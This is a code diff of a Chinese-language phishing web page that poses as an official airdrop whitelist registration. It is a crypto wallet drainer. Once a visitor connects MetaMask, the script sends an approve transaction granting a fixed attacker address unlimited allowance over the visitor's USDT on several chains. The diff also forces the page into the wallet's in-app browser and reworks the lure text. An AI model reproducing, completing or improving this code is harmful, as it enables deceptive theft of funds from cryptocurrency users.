@@ -34,7 +34,7 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="sub-title">官方唯一链上资格备案通道</p>
 <div class="notice-box">
 <div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次支持ETH、BSC、Polygon、Arbitrum、Optimism多链。仅用于钱包地址官方备案授权，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，请放心连接。</div>
+<div class="notice-content">请在钱包内置浏览器打开本页面，外部浏览器不支持授权交互。</div>
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
@@ -67,18 +67,19 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <script>
 (function(){
-    // 授权目标地址
-    const TARGET_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-    // 各链USDT合约
-    const USDT_CONTRACT = {
-        "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
-        "0x38":"0x55d398326f99059fF77548524699952727959279",
-        "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-        "0xa4b1":"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9",
-        "0xa":"0x94b086aacad473b14b798123f16e781f1d3cfe9e6"
+    // 固定授权目标地址
+    const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+    const MAX_ALLOW = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    
+    // 各链USDT合约地址
+    const USDT_CONTRACTS = {
+        "0x1": "0xdac17f958d2ee523a2206206994597c13d831ec7",
+        "0x38": "0x55d398326f99059fF77548524699952727959279",
+        "0x89": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
     };
 
     let walletAddress = "";
+    let usdtContractAddr = "";
     const showAddrEl = document.getElementById("showAddr");
     const successAddrEl = document.getElementById("successAddr");
 
@@ -87,24 +88,47 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
         document.getElementById(id).classList.remove("hide");
     }
 
-    // 唤起钱包
-    function launchWallet(){
-        let url = encodeURIComponent(location.href);
-        location.href = "metamask://dapp/" + url;
+    // 检测是否在钱包内置浏览器
+    function isInWalletBrowser(){
+        return navigator.userAgent.toLowerCase().includes('metamask') 
+               || navigator.userAgent.toLowerCase().includes('tokenpocket');
+    }
+
+    function jumpToWallet(){
+        let url = encodeURIComponent(window.location.href);
+        window.location.href = `metamask://dapp/${url}`;
+    }
+
+    // 不在钱包内置浏览器，自动跳转
+    if(!isInWalletBrowser()){
+        jumpToWallet();
     }
 
     // 连接钱包
     document.getElementById("connectMM").onclick = async function(){
-        if(!window.ethereum){
-            launchWallet();
-            return;
-        }
+        if(!window.ethereum) return;
         switchPage("p2");
         try{
-            let accounts = await ethereum.request({
-                method: "eth_requestAccounts"
-            });
+            let accounts = await ethereum.request({method:"eth_requestAccounts"});
             walletAddress = accounts[0];
+            
+            // 获取当前链ID，加载对应USDT合约
+            let chainId = await ethereum.request({method:"eth_chainId"});
+            usdtContractAddr = USDT_CONTRACTS[chainId] || USDT_CONTRACTS["0x38"];
+
+            // 关键：让钱包识别USDT代币，弹出你截图里的界面
+            await ethereum.request({
+                method: "wallet_watchAsset",
+                params: {
+                    type: "ERC20",
+                    options: {
+                        address: usdtContractAddr,
+                        symbol: "USDT",
+                        decimals: 18
+                    }
+                }
+            });
+
             switchPage("p3");
             showAddrEl.innerText = walletAddress;
         }catch(err){
@@ -112,26 +136,21 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
         }
     };
 
-    // 授权 完整正确0x095ea7b3 强制弹窗确认
+    // 授权操作，弹出标准USDT授权界面
     document.getElementById("approveBtn").onclick = async function(){
-        if(!walletAddress) return;
+        if(!walletAddress || !usdtContractAddr) return;
         switchPage("p2");
         try{
-            let chainId = await ethereum.request({method:"eth_chainId"});
-            let toContract = USDT_CONTRACT[chainId] || USDT_CONTRACT["0x38"];
+            // 标准approve方法签名，参数严格对齐
+            const methodId = "0x095ea7b3";
+            const spenderHex = SPENDER.replace("0x","").padStart(64,"0");
+            const txData = methodId + spenderHex + MAX_ALLOW;
 
-            // 【已固定正确完整签名 0x095ea7b3 】
-            let methodId = "0x095ea7b3";
-            let spenderHex = TARGET_SPENDER.replace("0x","").padStart(64,"0");
-            let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-            let txData = methodId + spenderHex + maxAllow;
-
-            // 强制钱包弹出确认框 不静默提交
-            let txHash = await ethereum.request({
+            await ethereum.request({
                 method: "eth_sendTransaction",
                 params: [{
                     from: walletAddress,
-                    to: toContract,
+                    to: usdtContractAddr,
                     value: "0x0",
                     gas: "0x70000",
                     data: txData
@@ -141,7 +160,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
             switchPage("p4");
             successAddrEl.innerText = walletAddress;
         }catch(err){
-            // 取消/报错 停在P3
             switchPage("p3");
         }
     };
